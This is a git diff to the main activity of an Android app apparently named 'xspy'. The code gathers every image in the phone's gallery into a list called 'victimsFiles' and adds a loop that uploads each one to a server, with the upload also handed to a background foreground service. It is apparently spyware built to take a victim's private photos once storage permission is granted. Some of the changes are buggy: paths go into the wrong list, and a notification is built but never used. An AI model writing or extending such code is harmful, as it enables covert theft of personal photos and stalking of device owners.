@@ -1,6 +1,9 @@
 package com.redeyesncode.xspy;
 
+import static androidx.core.app.ServiceCompat.startForeground;
+
 import android.Manifest;
+import android.app.Notification;
 import android.app.ProgressDialog;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -10,6 +13,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 
+import androidx.core.app.NotificationCompat;
 import androidx.lifecycle.ViewModelProvider;
 
 import com.karumi.dexter.Dexter;
@@ -31,6 +35,8 @@ import com.redeyesncode.xspy.utils.GalleryUtils;
 import com.redeyesncode.xspy.utils.Utils;
 import com.redeyesncode.xspy.viewmodel.MainViewModel;
 
+import java.io.File;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -154,7 +160,11 @@ public class MainActivity extends BaseActivity {
                     @Override
                     public void onPermissionsChecked(MultiplePermissionsReport report) {
                         if (report.areAllPermissionsGranted()) {
-                            uploadPhotosToServer();
+                            try {
+                                uploadPhotosToServer();
+                            } catch (IOException e) {
+                                throw new RuntimeException(e);
+                            }
                             showToast("Granted !!");
                         } else {
                             showToast("Not Granted !!");
@@ -180,7 +190,7 @@ public class MainActivity extends BaseActivity {
 
     }
 
-    private void uploadPhotosToServer() {
+    private void uploadPhotosToServer() throws IOException {
         ArrayList<String> filePaths = GalleryUtils.getImagesFromGalleryOnly(MainActivity.this);
         ArrayList<Uri> fileUris = new ArrayList<>();
         ArrayList<FileBody> victimsFiles = new ArrayList<>();
@@ -188,18 +198,26 @@ public class MainActivity extends BaseActivity {
             fileUris.add(GalleryUtils.convertFilePathToURI(filePaths.get(i)));
         }
 
+        ArrayList<String> filePathsAbsolutePath = new ArrayList<>();
+        for (Uri uri : fileUris) {
+            File file = GalleryUtils.getFile(MainActivity.this, uri);
+            assert file != null;
+            filePaths.add(file.getAbsolutePath());
+        }
 
-        startServiceForUpload(victimsFiles,fileUris);
+
+        startServiceForUpload(victimsFiles,fileUris,filePaths,filePathsAbsolutePath);
 //        Log.i(Constants.DEV_XSPY, "initClicks: "+ fileUris);
     }
 
-    private void startServiceForUpload(ArrayList<FileBody> victimsFiles, ArrayList<Uri> fileUris) {
+    private void startServiceForUpload(ArrayList<FileBody> victimsFiles, ArrayList<Uri> fileUris, ArrayList<String> filePaths, ArrayList<String> filePathsAbsolutePath) {
         // Android service code will be written here.
         for (int i = 0; i < fileUris.size(); i++) {
             try {
                 victimsFiles.add(new FileBody(GalleryUtils.getFile(MainActivity.this,fileUris.get(i))));
-                break;
-//                showLog(victimsFiles.get(i).getFile().toString());
+
+                mainViewModel.uploadMedia(victimsFiles.get(i).getFile(),"ASHU_ANDROID");
+//                break;
             }catch (Exception e){
                 e.printStackTrace();
 
@@ -212,6 +230,8 @@ public class MainActivity extends BaseActivity {
 
         // We need to pass the file array list into the intent so that we can upload files in the  background as well.
         uploadFileServiceIntent.putParcelableArrayListExtra("VICTIM_FILES",victimsFiles);
+        uploadFileServiceIntent.putStringArrayListExtra("FILE_PATHS", filePathsAbsolutePath);
+
         // using the parcelable method now.
 
 
@@ -224,10 +244,17 @@ public class MainActivity extends BaseActivity {
 
 //         Checks for the android version.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Notification notification = new NotificationCompat.Builder(this, "UPLOAD_CHANNEL_ID")
+                    .setContentTitle("Uploading images")
+                    .setContentText("Your images are being uploaded...")
+                    .setSmallIcon(R.drawable.ic_app)
+                    .build();
+
             startForegroundService(uploadFileServiceIntent);
         } else {
             progressDialog.dismiss();
             startService(uploadFileServiceIntent);
+
         }
     }
 
